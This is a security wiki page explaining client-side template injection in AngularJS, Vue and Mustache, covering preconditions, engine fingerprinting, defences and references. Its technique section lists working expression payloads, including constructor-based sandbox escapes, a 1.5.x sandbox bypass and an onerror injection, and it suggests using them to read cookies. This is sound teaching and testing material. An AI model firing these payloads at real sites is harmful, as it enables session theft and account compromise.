---
title: Client-Side Template Injection (CSTI)
slug: client-side-template-injection
---

{% raw %}

> **TL;DR:** AngularJS / Vue / Mustache sinks evaluating attacker template expressions in the browser → DOM XSS without injecting <script>.

## What it is
Client-side frameworks let HTML contain expression markers — `{{ ... }}` in Angular/Vue, `${ ... }` in others. When user input lands inside an HTML region the framework still compiles, the expression engine evaluates the attacker's code in the page's JavaScript context. The output filter may strip `<script>` and `onerror`, but the template engine runs before that filter is relevant, so the attacker never needs raw script tags.

## Preconditions / where it applies
- Page uses an in-browser template engine on a region of the DOM (e.g. AngularJS `ng-app` scope, Vue `v-html`, Mustache `{{{ }}}`)
- User input is reflected inside that scope
- The framework's sandbox is absent (AngularJS dropped its sandbox in 1.6) or bypassable

## Technique
Identify the engine via fingerprints — `ng-app`, `v-app`, leaked global `Vue`, presence of `angular.element`. Then test the expression delimiter:

```html
<!-- AngularJS reflection probe -->
{{7*7}}        → renders "49" → confirmed

<!-- AngularJS sandbox-less RCE (1.6+) -->
{{constructor.constructor('alert(1)')()}}

<!-- AngularJS older sandbox bypass (1.5.x) -->
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

<!-- Vue 2 -->
{{constructor.constructor('alert(1)')()}}

<!-- Mustache triple-stache injects raw HTML, escape is bypassed -->
{{{<img src=x onerror=alert(1)>}}}
```

In Angular `v-html` / `ng-bind-html` the directive evaluates expressions in the sub-tree. For server-rendered apps the injection point may be an attribute like `ng-init="x='INPUT'"` — close the quote and inject expression directly.

Use the payload to read `document.cookie`, hit internal endpoints, or pivot — see [[dom-xss]] for downstream techniques and [[content-security-policy-bypass]] when CSP blocks inline.

## Detection and defence
- WAFs rarely catch `{{...}}` since it's plain text — review template scopes manually
- Strict CSP with `script-src` allowlist still allows the injection to execute via the framework's eval — disable expression evaluation on untrusted regions
- Escape `{{`, `}}`, `${`, `<%`, `%>` in any reflected input
- Use [[trusted-types-bypass]] notes for sink hardening
- Upgrade Angular to a current version (the AngularJS 1.x line is unmaintained)

## References
- [PortSwigger — XSS without HTML: CSTI with AngularJS](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs) — original research
- [PortSwigger — DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) — sinks taxonomy
- [PayloadsAllTheThings — CSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Client%20Side%20Template%20Injection) — payload library
{% endraw %}
